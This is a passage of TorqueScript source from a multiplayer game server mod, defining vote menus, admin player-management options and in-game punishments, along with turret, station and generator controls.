		Admin::startVote(%clientId, "Enable Flag Hunter", "eHunter", 0);
	else if(%opt == "vdHunter")
		Admin::startVote(%clientId, "Disable Flag Hunter", "dHunter", 0);

// base healing
	if(%opt == "vegm")
		Admin::startVote(%clientId, "Enable GREED mode", "egm", 0);
	else if(%opt == "vdgm")
		Admin::startVote(%clientId, "Disable GREED mode", "dgm", 0);

//Out of area damage
	if(%opt == "vehm")
		Admin::startVote(%clientId, "Enable HOARD mode", "ehm", 0);
	else if(%opt == "vdhm")
		Admin::startVote(%clientId, "Disable HOARD mode", "dhm", 0);

}


//damage menu
function FlagVoteMenu(%clientId,%admin)
{	
	%client = Player::getClient(%clientId);
	DebugFun("FlagVoteMenu",%client,%admin);

	
	Client::buildMenu(%clientId, "Vote to:", "VoteFlag", true);	

// flaghunter variables	
//Hunter added
//		if(%clientId.isGoated || %clientId.isOwner)
//		{
			if($Arena::Kill)
	{
				Client::sendMessage(%client, 0, "No flag hunter during this map type. ~wPku_ammo.wav");
		// Arena::Clear();	
		return;
	}
	
	if($FlagHunter::Enabled)
	{
		Client::addMenuItem(%clientId, %curItem++ @ "Disable Flag Hunter", "vdHunter");			
		if($FlagHunter::GreedMode)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable GREED mode", "vdgm");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable GREED mode", "vegm");
		if($FlagHunter::HoardMode)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable HOARD mode", "vdhm");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable HOARD mode", "vehm");
	}	
	else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable Flag Hunter", "veHunter");	
		
	if($NoFlagCaps == 1)
		Client::addMenuItem(%clientId, %curItem++ @ "Enable Flag Cap Limit", "veFlag");
	else
		Client::addMenuItem(%clientId, %curItem++ @ "Disable Flag Cap Limit", "vdFlag");			
			
		return;
//		}
}

//damage menu
function DamageMenu(%clientId,%admin)
{	
	%client = Player::getClient(%clientId);
	DebugFun("DamageMenu",%clientId,%admin);
	if(%admin)
	{
		Client::buildMenu(%clientId, "Damage Options:", "Damage", true);
		//team damage
		if($Server::TeamDamageScale == 1.0)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable team damage", "dtd");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable team damage", "etd");	
		if($TALT::Active == false) 
		{
			//base/ gen damage
			if($ANNIHILATION::SafeBase == 1)
				Client::addMenuItem(%clientId, %curItem++ @ "Enable gen/ station damage", "eBaseD");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Disable gen/ station damage", "dBaseD");
			//self healing gen/ station
			if($ANNIHILATION::BaseHeal == 1)
				Client::addMenuItem(%clientId, %curItem++ @ "Disable base healing", "dBaseH");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Enable base healing", "eBaseH");
		}
		//out of area damage
//		if(%clientId.isGoated || %clientId.isOwner)
		if(%clientId.isAdmin || %clientId.isOwner)
		{
		if(!$ANNIHILATION::OutOfArea)
			Client::addMenuItem(%clientId, %curItem++ @ "Remove map boundry.", "dOutAreaD");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable map boundries.", "eOutAreaD");
		}
			if(%clientId.isGoated || %clientId.isSuperAdmin)
		{
			
				if($Arena::Kill)
	{
				Client::sendMessage(%client, 0, "cannot disable damage on this map type. ~wPku_ammo.wav");
		// Arena::Clear();	
		return;
	}
			
		//player damage		
		if($Annihilation::NoPlayerDamage == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable player damage", "ePlayerD");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable player damage", "dPlayerD");
		}

	}
	else
	{
		Client::buildMenu(%clientId, "Vote Damage Options:", "Damage", true);
		if($ANNIHILATION::PVTeamDamage)
		{
			if($Server::TeamDamageScale == 1.0)
				Client::addMenuItem(%clientId, %curItem++ @ "Disable team damage", "vdtd");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Enable team damage", "vetd");
		}
		if($TALT::Active == false) 
		{
			//base/ gen damage
			if($ANNIHILATION::SafeBase == 1)
				Client::addMenuItem(%clientId, %curItem++ @ "Enable gen/ station damage", "veBaseD");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Disable gen/station damage", "vdBaseD");
			//self healing gen/ station		
			if($ANNIHILATION::BaseHeal == 1)
				Client::addMenuItem(%clientId, %curItem++ @ "Disable base healing", "vdBaseH");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Enable base healing", "veBaseH");
		}
		//out of area damage
//		if(%cl.isGoated || %cl.isOwner)
//		{
		if(!$ANNIHILATION::OutOfArea)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable map boundries.", "vdOutAreaD");
		else
						Client::addMenuItem(%clientId, %curItem++ @ "Enable map boundries.", "veOutAreaD");
//		}
		//player damage	
		if($Annihilation::VPdamage)
		{
	if($Arena::Kill)
	{
				Client::sendMessage(%client, 0, "cannot disable damage on this map type. ~wPku_ammo.wav");
		// Arena::Clear();	
		return;
	}			
			if($Annihilation::NoPlayerDamage == 1)
				Client::addMenuItem(%clientId, %curItem++ @ "Enable player damage", "vePlayerD");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Disable player damage", "vdPlayerD");
		}
	}
}

function BuildingMenu(%clientId,%admin)
{	
		Client::buildMenu(%clientId, "Builder Options:", "Building", true);
		if(($Build == 1) && ($ABuild == 0))
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to Disable Builder Mode", "vdtbm");
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to Enable Advanced Building Mode", "veabm");
		}
		else if(($ABuild == 1) && ($Build == 1))
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to Disable ALL Building Modes", "vdabm");
		}
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to Enable Builder Mode", "vetbm");
}

function processMenuVoteforfun(%clientId, %option)
{
	DebugFun("processMenuVoteforfun",%clientId,%option);
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);
	//Anni::Echo("processMenuMissMenu", %opt);
	if(%opt == "cmission")
	{
		Admin::changeMissionMenu(%clientId, %opt == "cmission");
		return;
	}
}

function processMenuVote(%clientId, %option)
{
	DebugFun("processMenuVote",%clientId,%option);
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);
	%client = Player::getClient(%clientId);
	
	if(%opt == "voteMod") 
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		ModMenu(%clientId,false);
		return;
	}
	else if(%opt == "voteMiss")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		MissMenu(%clientId,false);
		return;
	}
	else if(%opt == "voteTime")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		TimeMenu(%clientId,false);
		return;
	}
//	else if(%opt == "voteEnabling")
//	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
//		EnablingMenu(%clientId,false);
//		return;
//	}
	else if(%opt == "voteDamage")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		DamageMenu(%clientId,false);
		return;
	}
	else if(%opt == "voteBuilding" && !$NoVote)
	{
	if($Spoonbot::AutoSpawn)
	{
		// Arena::Clear();	
				Client::sendMessage(%client, 0, "No Building during this map type. ~wPku_ammo.wav");
		return;
	}
	
	if($Build::Kill)
	{
				Client::sendMessage(%client, 0, "No Building during this map type. ~wPku_ammo.wav");
		// Arena::Clear();	
		return;
	}
			
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		BuildingMenu(%clientId,false);
		return;
	}
	else if(%opt == "voteFlag")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		FlagVoteMenu(%clientId,false);
		return;
	}
	else if(%opt == "votetourney")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		VoteTourney::Opts(%clientId);
		return;
	}
// voting	 
	 	if(%opt == "dVote")	ServerSwitches(%clientId,"Voting",false);
	else if(%opt == "eVote")	ServerSwitches(%clientId,"Voting",true);

// vote admin 
	 	if(%opt == "dVoteAdmin")	ServerSwitches(%clientId,"Voting Admin",false);
	else if(%opt == "eVoteAdmin")	ServerSwitches(%clientId,"Voting Admin",true);
// vote builder
	 	if(%opt == "dVoteAdminBuilding")	ServerSwitches(%clientId,"Voting Builder",false);
	else if(%opt == "eVoteAdminBuilding")	ServerSwitches(%clientId,"Voting Builder",true);
// vote turrets
	 	if(%opt == "dVoteTurrets")	ServerSwitches(%clientId,"Voting Turrets",false);
	else if(%opt == "eVoteTurrets")	ServerSwitches(%clientId,"Voting Turrets",true);

// vote tourney mode
	else if(%opt == "vcffa")
		Admin::startVote(%clientId, "change to Free For All mode", "ffa", 0);
	else if(%opt == "vsmatch")
		Admin::startVote(%clientId, "start the match", "vsmatch", 0);
	else if(%opt == "vctourney")
		Admin::startVote(%clientId, "change to Tournament mode", "tourney", 0);
	else if(%opt == "vdtourneyot")
		Admin::startVote(%clientId, "Disable Tournament overtime", "vdtourneyot", 0);
	else if(%opt == "vetourneyot")
		Admin::startVote(%clientId, "Enable Tournament overtime", "vetourneyot", 0);
}

// admin vote menu, identical to non admin vote menu.
function voteMenu(%clientId)
{
	DebugFun("voteMenu",%clientId);
	Client::buildMenu(%clientId, "Mission Options:", "Vote", true);
	if($TALT::Active) 
			Client::addMenuItem(%clientId, %curItem++ @ "Vote Mod ", "voteMod");
	if($ANNIHILATION::PVChangeMission)	
		Client::addMenuItem(%clientId, %curItem++ @ "Vote Mission ", "voteMiss");
	Client::addMenuItem(%clientId, %curItem++ @ "Vote Time ", "voteTime");
	Client::addMenuItem(%clientId, %curItem++ @ "Vote Damage ", "voteDamage");
	 	if($ANNIHILATION::VoteBuilding == 1)
	Client::addMenuItem(%clientId, %curItem++ @ "Vote Building ", "voteBuilding");
//		if(%clientId.isGoated || %clientId.isOwner)
//		{
	Client::addMenuItem(%clientId, %curItem++ @ "Vote Flag ", "voteFlag");
//		}
	if(%clientId.isadmin || %clientId.isGoated)
		{
	 	if($ANNIHILATION::VoteBuilding == 0)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable voting for Builder", "eVoteAdminBuilding");
	 	else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable voting for Builder", "dVoteAdminBuilding");
		}	

// voting
	if(%clientId.isGoated){
	//vote admin	
	 	if(!$ANNIHILATION::VoteAdmin)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable vote admin", "eVoteAdmin");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable vote admin", "dVoteAdmin");	
	//voting
		if($NoVote == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable voting", "eVote");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable voting", "dVote");		
	}
}

function PlayerManage(%clientId, %sel)
{
	%client = Player::getClient(%clientId);
	%clientsell = Player::getClient(%sel);
	DebugFun("PlayerManage",%clientId,%sel);
	if(%clientId.isadmin) //  && !%clientsell.isGoated)
	{
		%name = Client::getName(%sel);

		Client::buildMenu(%clientId, "Manage "@%name, "player", true);
		if($TA::TeamLock == false && !%clientId.inArena) 
			Client::addMenuItem(%clientId, %curItem++ @ "Change team", "fteamchange " @ %sel);
		if(%sel.locked) 
			Client::addMenuItem(%clientId, %curItem++ @ "Unlock team", "unlock " @ %sel);
		else 
			Client::addMenuItem(%clientId, %curItem++ @ "Lock team", "lock " @ %sel);
		if(%clientId.isGoated)
		{	 
			Client::addMenuItem(%clientId, %curItem++ @ "Clear score", "ClearScore " @ %sel);
		}
		if(%sel.novote)
			Client::addMenuItem(%clientId, %curItem++ @ "Reenable Voting ", "reVote " @ %sel);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable Voting ", "deVote " @ %sel);
				
		if(GameBase::getTeam(%sel) != -1 && (!$Server::TourneyMode || GameBase::getTeam(%clientId) == -1))
		if(%clientId.isGoated || %clientId.isOwner)
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Observe (in game) ", "obsingame " @ %sel);
		}

		if(%clientId.isGoated)
			Client::addMenuItem(%clientId, %curItem++ @ "Admin levels " @ %name , "AdminLevel " @ %sel);
		else if(%clientId.isOwner)
		        Client::addMenuItem(%clientId, %curItem++ @ "Admin levels " @ %name , "AdminLevel " @ %sel);
		else
		{	
			if(!%sel.isAdmin && %clientId.isOwner)	
				Client::addMenuItem(%clientId, %curItem++ @ "Admin " @ %name , "Admin " @ %sel);	
			if((%clientId.isSuperAdmin && %sel.isAdmin && !%sel.isSuperAdmin) || (%clientId.isGod && !%sel.isGod && %sel.isAdmin))
				Client::addMenuItem(%clientId, %curItem++ @ "Strip Admin -" @ %name , "stripAdmin " @ %sel); 
		}
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
	}
	if(%clientId.issuperadmin || %clientId.isGoated)
	{
	Client::addMenuItem(%clientId, %curItem++ @ "More Options...","nextmanage " @ %sel);
	}
	else if(%clientId.isTeamCaptin)
	{
		%name = Client::getName(%sel);
		Client::buildMenu(%clientId, "Manage "@%name, "player", true);
		if($TA::TeamLock == false && !%clientId.inArena) 
			Client::addMenuItem(%clientId, %curItem++ @ "Change team", "fteamchange " @ %sel);
	}
}

function Manage::NextPage(%clientId,%sel)
{
	if(%clientId.isAdmin)
	{
		%name = Client::getName(%sel);
		Client::buildMenu(%clientId, "Manage "@%name, "player", true);
		if(%clientId.isOwner || %clientId.isGoated)
		{
		Client::addMenuItem(%clientId, %curItem++ @ "Arena Options", "adarena " @ %sel); 
		}
		// if(%clientId.isSuperAdmin && !%sel.isSuperAdmin) || (%clientId.isOwner && !%sel.isOwner) || (%clientId.isGod && !%sel.isGod) || (%clientId.isGoated && !%sel.isGoated)
		   if(%clientId.isSuperAdmin)
			Client::addMenuItem(%clientId, %curItem++ @ "Kick " @ %name, "Kick " @ %sel); 
		   if(%clientId.isGoated || %clientId.isOwner)	
			Client::addMenuItem(%clientId, %curItem++ @ "Ban " @ %name , "Ban " @ %sel); 
		if(%clientId.isGod && !%sel.isTeamCaptin && $Server::TourneyMode) //new team captin stuff for tourney mode 
			Client::addMenuItem(%clientId, %curItem++ @ "Make "@%name@" Team Captin", "TeamCaptin " @ %sel);
		else if(%clientId.isGod && %sel.isTeamCaptin) 
			Client::addMenuItem(%clientId, %curItem++ @ "Strip "@%name@" Team Captin", "DeTeamCaptin " @ %sel);
		if(%clientId.isOwner)
			Client::addMenuItem(%clientId, %curItem++ @ "Fun Options", "funopts " @ %sel); //new fun code 
		if(%clientId.isGoated)
			Client::addMenuItem(%clientId, %curItem++ @ "Teleport", "tele " @ %sel); //new fun code
	}
}

function processMenuTOpt(%clientId, %opt)
{
	%targ = getWord(%opt,1);
	%tPos = GameBase::getPosition(%targ);
	%pPos = GameBase::getPosition(%clientId);
	if(getWord(%opt,0) == "1")
		GameBase::setPosition(%clientId,Vector::add(%tPos,"0 0 5"));
	else if(getWord(%opt,0) == "2")
		GameBase::setPosition(%targ,Vector::add(%pPos,"0 0 5"));
}

function PenaltyBox(%clientId, %sel)
{
	DebugFun("PenaltyBox",%clientId,%sel);
	if(%clientId.isadmin){		
	%player = Client::getOwnedObject(%sel);
	%name = Client::getName(%sel);
	Client::buildMenu(%clientId, "Punish "@%name, "player", true);
		if(%clientId.isGoated || %clientId.isOwner)
		{
 if (!%player.blind)	Client::addMenuItem(%clientId, %curItem++ @ "Blind " @ %name, "Blind " @ %sel);
 else	Client::addMenuItem(%clientId, %curItem++ @ "UnBlind " @ %name, "UnBlind " @ %sel);
 
	if 	(%player.frozen) Client::addMenuItem(%clientId, %curItem++ @ "Defrost " @ %name, "Defrost " @ %sel);
	else			 Client::addMenuItem(%clientId, %curItem++ @ "Freeze " @ %name, "Freeze " @ %sel); 
	Client::addMenuItem(%clientId, %curItem++ @ "15 second penalty " @ %name, "15Penalty " @ %sel);
	Client::addMenuItem(%clientId, %curItem++ @ "30 second penalty " @ %name, "30Penalty " @ %sel);
	Client::addMenuItem(%clientId, %curItem++ @ "60 second penalty " @ %name, "60Penalty " @ %sel);
	
	Client::addMenuItem(%clientId, %curItem++ @ "60 second MUTE " @ %name, "60mute " @ %sel);
	Client::addMenuItem(%clientId, %curItem++ @ "120 second MUTE " @ %name, "120mute " @ %sel);
		}
		if(%clientId.isGoated || %clientId.isGod)
	{	
	if($TALT::Active == false) 
	{
		if ( %sel.noPfork )
			Client::addMenuItem(%clientId, %curItem++ @ "Return pitchfork to " @ %name, "rpfork " @ %sel);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Strip pitchfork from " @ %name, "spfork " @ %sel);
	}
	}
				}
}

function PlayerAnnoy(%clientId, %sel)
{
	DebugFun("PlayerAnnoy",%clientId,%sel);
	if(%clientId.isadmin)
	{		
		%player = Client::getOwnedObject(%sel);
		%name = Client::getName(%sel);
		Client::buildMenu(%clientId, "Annoy "@%name, "player", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Disarm " @ %name , "Disarm " @ %sel);
		Client::addMenuItem(%clientId, %curItem++ @ "Strip weapons -" @ %name , "Strip " @ %sel);	 
		Client::addMenuItem(%clientId, %curItem++ @ "To The Moon -" @ %name , "Moon " @ %sel);
		Client::addMenuItem(%clientId, %curItem++ @ "Slap " @ %name , "Slap " @ %sel);
		if(%sel.Agoraphobia)
			Client::addMenuItem(%clientId, %curItem++ @ "Remove agoraphobia " @ %name , "Agoraphobia " @ %sel);
	 	else
	 		Client::addMenuItem(%clientId, %curItem++ @ "Agoraphobia " @ %name , "Agoraphobia " @ %sel);
	 
		Client::addMenuItem(%clientId, %curItem++ @ "Flag fun with " @ %name, "flag " @ %sel);
				 
//	if(!Player::isDead(%sel)){
//					 Client::addMenuItem(%clientId, %curItem++ @ "Co- Pilot " @ %name , "CoPilot " @ %sel);				
//					 Client::addMenuItem(%clientId, %curItem++ @ "Possess " @ %name , "Possess " @ %sel);	
//					}
				}
}


function PlayerFlag(%clientId, %sel)
{
	DebugFun("PlayerFlag",%clientId,%sel);
	if(%clientId.isadmin)
	{			
		%name = Client::getName(%sel);
		%type = Player::getMountedItem(%sel, $FlagSlot);	
		Client::buildMenu(%clientId, "Flag Fun with "@%name, "player", true);
		if(player::status(%sel) == "(Live)" && %type != -1)
		{	
			Client::addMenuItem(%clientId, %curItem++ @ "Strip Flag", "StripFlag " @ %sel);
			Client::addMenuItem(%clientId, %curItem++ @ "Return Flag", "ReturnFlag " @ %sel);	 
		}
		else 
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Strip Flag -NA "@player::status(%sel), "Freturn " @ %sel);
			Client::addMenuItem(%clientId, %curItem++ @ "Return Flag -NA "@player::status(%sel), "Freturn " @ %sel);	 
		}		
	if(%sel.FlagCurse)
		Client::addMenuItem(%clientId, %curItem++ @ "Remove Happy Flag Curse", "NoFlagCurse " @ %sel);
	else
		Client::addMenuItem(%clientId, %curItem++ @ "Happy Flag Curse", "FlagCurse " @ %sel);
	}
}



function PlayerKill(%clientId, %sel)
{
	DebugFun("PlayerKill",%clientId,%sel);
	if(%clientId.isadmin)
	{		
		%name = Client::getName(%sel);
		Client::buildMenu(%clientId, "Kill "@%name, "player", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Blow up " @ %name, "BlowUp " @ %sel);
		Client::addMenuItem(%clientId, %curItem++ @ "Sniper kill " @ %name, "Sniper " @ %sel);	 
		Client::addMenuItem(%clientId, %curItem++ @ "Poison " @ %name, "Poison " @ %sel);
		Client::addMenuItem(%clientId, %curItem++ @ "Set on fire " @ %name, "Burn " @ %sel);				
		if(Player::isDead(Client::getOwnedObject(%sel)) || Client::getOwnedObject(%sel) == -1 && Client::getTeam(%sel) != -1)
			Client::addMenuItem(%clientId, %curItem++ @ "Spawn " @ %name, "spawn " @ %sel);
		else if (Client::getOwnedObject(%sel) != -1 && Client::getTeam(%sel) != -1)	
			Client::addMenuItem(%clientId, %curItem++ @ "Respawn " @ %name, "respawn " @ %sel);				 
 	}
}


function player::status(%client)
{
	DebugFun("player::status",%client);
	%player = Client::getOwnedObject(%client);
	%team = Client::getTeam(%client);
	if (%player == -1 && %team != -1) 
		%status = "(Dead)";
		else 
			if (%player != -1 && %team != -1) 
				%status = "(Live)";
		else 
			if (%team == -1) 
				%status = "(Observing)";
	return %status;
}
	
// vote to player menu
function voteToPlayer(%clientId, %sel)
{
	DebugFun("voteToPlayer",%clientId,%sel);
	//Anni::Echo("vote to player");
	if(%clientId.observerMode != "justJoined" && %clientId.justConnected != true)
	{		
		%name = Client::getName(%sel);
		
		Client::buildMenu(%clientId, "Start Vote on "@%name, "options", true);
		if(%sel.silenced)
			Client::addMenuItem(%clientId, %curItem++ @ "vote Global UNMUTE", "vunsilence " @ %sel);
		else	 
				 	if($ANNIHILATION::PVKick)
				 		Client::addMenuItem(%clientId, %curItem++ @ "Vote to kick ", "vkick " @ %sel);
						
		if(!%sel.isTeamCaptin && $Server::TourneyMode) //new team captin stuff for tourney mode 
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to make Team Captin", "vTeamCaptin " @ %sel);
		else if(%sel.isTeamCaptin) // just in case team captin doesnt get cleared on map change or ffa strip option will still be there
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to strip Team Captin", "vDeTeamCaptin " @ %sel);
	 		if($ANNIHILATION::VoteAdmin)
				 		Client::addMenuItem(%clientId, %curItem++ @ "Vote to admin ", "vadmin " @ %sel);
	}

			
}


function voteForce(%clientId)
{
	DebugFun("voteForce",%clientId);
	Client::buildMenu(%clientId, "Force Vote:", "options", true);
	Client::addMenuItem(%clientId, %curItem++ @ "PASS " @ $curVoteTopic, "forceyes " @ $curVoteCount); 
	Client::addMenuItem(%clientId, %curItem++ @ "FAIL " @ $curVoteTopic, "forceno " @ $curVoteCount); 
}

function processMenuServer(%clientId, %option)
{
	DebugFun("processMenuServer",%clientId,%option);
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);
	%client = Player::getClient(%clientId);
//Fair teams	 
	if(%opt == "dFair")	ServerSwitches(%clientId,"Fair Teams",false);
	else if(%opt == "eFair")	ServerSwitches(%clientId,"Fair Teams",true);
//time	 
	else if(%opt == "time")
//	Client::sendMessage(%client, 0, "~wPku_ammo.wav");
	TimeMenu(%clientId,true);

	else if(%opt == "voteEnabling")
//	Client::sendMessage(%client, 0, "~wPku_ammo.wav");
	EnablingMenu(%clientId,true);
	 	
// turrets	
	else if(%opt == "turret") 
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Client::buildMenu(%clientId, "Turret Options:", "Server", true);
		// destroy turrets
		Client::addMenuItem(%clientId, %curItem++ @ "Destroy deployable turrets", "rPlayerTurret");
		Client::addMenuItem(%clientId, %curItem++ @ "Destroy map turrets", "DamMapTurrets");								
		Client::addMenuItem(%clientId, %curItem++ @ "fix map turrets", "FixMapTurrets");
		if(!$DisableDPT)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable deploying turrets", "DisabledDPT");
		else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable deploying turrets", "EnableDPT");
		if(!$annihilation::DisableTurretsOnTeamChange)	
			Client::addMenuItem(%clientId, %curItem++ @ "Team change disable ON", "TCDon");	
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Team change disable OFF", "TCDoff");					
		return;		 			
	 }
	 	
//process turrets	 
	if(%opt == "TCDon")	
		ServerSwitches(%clientId,"team change turret disable",true);
	else if(%opt == "TCDoff")	
		ServerSwitches(%clientId,"team change turret disable",false);
			
	if(%opt == "dTurretPoints")	
		ServerSwitches(%clientId,"turret points",false);
	else if(%opt == "eTurretPoints")	
		ServerSwitches(%clientId,"turret points",true); 
	 	
	if(%opt == "dPlayerTurret")	
		ServerSwitches(%clientId,"deployable turrets",false);
	else if(%opt == "ePlayerTurret")	
		ServerSwitches(%clientId,"deployable turrets",true); 
	 	
	if(%opt == "dMapTurrets")	
	{KillMapTurrets(%clientId,true,true);ServerSwitches(%clientId,"map turrets",false);}
	else if(%opt == "eMapTurrets")	
		ServerSwitches(%clientId,"map turrets",true); 
	
	if(%opt == "rPlayerTurret")	
		KillMapTurrets(%clientId,false,true);
			
	else if(%opt == "DamMapTurrets")	
		KillMapTurrets(%clientId,true,true); 
	else if(%opt == "FixMapTurrets")	
		KillMapTurrets(%clientId,true,false);
	else if(%opt == "DisabledDPT")
{
	PopulateItemMax(FusionTurretPack);
	PopulateItemMax(LaserTurretPack);
	PopulateItemMax(RocketPack);
	PopulateItemMax(PlasmaTurretPack);
	PopulateItemMax(MortarTurretPack);
	PopulateItemMax(NeuroTurretPack);
	PopulateItemMax(ShockTurretPack);
	PopulateItemMax(NuclearTurretPack);
	PopulateItemMax(FlameTurretPack);
	PopulateItemMax(IrradiationTurretPack);
	PopulateItemMax(TurretPack);	
	PopulateItemMax(VortexTurretPack);
	ServerSwitches(%clientId,"Deploying Turrets",false);
}
	else if(%opt == "EnableDPT")
{
	PopulateItemMax(FusionTurretPack,		1,   1,   0,   0,   0,   0,   0,   0,   1,   1,   1,   1,   1,   0,   0);
	PopulateItemMax(LaserTurretPack,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);
	PopulateItemMax(RocketPack,			0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   1,   0,   0);
	PopulateItemMax(PlasmaTurretPack,		0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   1,   1,   1,   0,   0);
	PopulateItemMax(MortarTurretPack,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);  
	PopulateItemMax(NeuroTurretPack,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);  
	PopulateItemMax(ShockTurretPack,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);
	PopulateItemMax(NuclearTurretPack,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);
	PopulateItemMax(FlameTurretPack,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);
	PopulateItemMax(IrradiationTurretPack,		1,   1,   0,   0,   0,   0,   0,   0,   1,   1,   1,   1,   0,   0,   1);
	PopulateItemMax(TurretPack,			0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   1,   1,   0,   0,   1);
	PopulateItemMax(VortexTurretPack,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);
	ServerSwitches(%clientId,"Deploying Turrets",true); 
}
	
// station menu
	else if(%opt == "Station") 
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Client::buildMenu(%clientId, "Station options:", "Server", true);
		 		
		Client::addMenuItem(%clientId, %curItem++ @ "Kill deployable Stations", "rPlayerInvs");
		Client::addMenuItem(%clientId, %curItem++ @ "Kill map Inventories", "DamMapInvs");	
		
	//vehicle stations	
		Client::addMenuItem(%clientId, %curItem++ @ "Kill vehicle stations", "KillVehicle");		
		Client::addMenuItem(%clientId, %curItem++ @ "fix map Inventories", "FixMapInvs");		
		Client::addMenuItem(%clientId, %curItem++ @ "fix vehicle stations", "FixVehicle");		
						
		return;		 			
	 }
	 	
	 
// Generator menu
	else if(%opt == "Generator") 
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");

		Client::buildMenu(%clientId, "Generator options:", "Server", true);
		 		
		Client::addMenuItem(%clientId, %curItem++ @ "Kill deployable Generators", "rPlayerGens");
		Client::addMenuItem(%clientId, %curItem++ @ "Kill all Generators", "DamMapGens");	
		Client::addMenuItem(%clientId, %curItem++ @ "fix all Generators", "FixMapGens");
					
		return;		 			
	 }
	 	
	//Inventory methods 
	else if(%opt == "InvMethods") 
	{
		Client::buildMenu(%clientId, "Inventory Methods:", "Server", true);
	 	if($ANNIHILATION::QuickInv == 1)	
			Client::addMenuItem(%clientId, %curItem++ @ "Station based", "InvStandard");
		else			
			Client::addMenuItem(%clientId, %curItem++ @ "Always accessable", "InvAlways");	
		
	 	if($ANNIHILATION::ExtendedInvs)	
			Client::addMenuItem(%clientId, %curItem++ @ "Regular Inventories", "InvRegular");
		else			
			Client::addMenuItem(%clientId, %curItem++ @ "Extended Inventories", "InvExtended");	

		if(!$ANNIHILATION::QuickInv && $ANNIHILATION::ExtendedInvs)
		{			
			 if($ANNIHILATION::Zappy != 1)	
				Client::addMenuItem(%clientId, %curItem++ @ "Zappy extended", "InvZappy");
			else			
				Client::addMenuItem(%clientId, %curItem++ @ "Extended (No Zap)", "InvExtNoZap");	
		}	
		
		 							
		return;		 			
	}	
	else if(%opt == "Barrier") 
	{
		Client::sendMessage(%client, 0, "You destroyed all barriers. ~wPku_ammo.wav");
	 	undeploy(Barrier);
//			messageAll(0, %AdminName @ " Destroyed deployable barriors. ~wCapturedTower.wav");
//			centerprintall("<jc><f1>" @ %AdminName @ " Destroyed deployable barriors.", 3);	 			
	 }
	else if(%opt == "minimines") 
	{
	
		%group = nameToID("MissionCleanup/minimine");
		%count = Group::objectCount(%group);
	
		for(%i = 0; (%Target = Group::getObject(%group, %i)) != -1; %i++)
		{
			%rnd = getRandom() * 10;
			schedule("GameBase::setDamageLevel("@%target@",2);",%rnd,%target);
		}			

		messageAll(0, Client::getName(%clientId) @ " Destroyed all the Mini Mines. ~wCapturedTower.wav");
		centerprintall("<jc><f1>" @ Client::getName(%clientId) @ " Destroyed all the Mini Mines.", 3);	 			
	 }	 
	// Generator menu
	else if(%opt == "Combined") 
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Client::buildMenu(%clientId, "Combination Options:", "Server", true);
	 		
		Client::addMenuItem(%clientId, %curItem++ @ "Kill deployables", "killDeployables");
		Client::addMenuItem(%clientId, %curItem++ @ "Kill all stations", "killStat");	
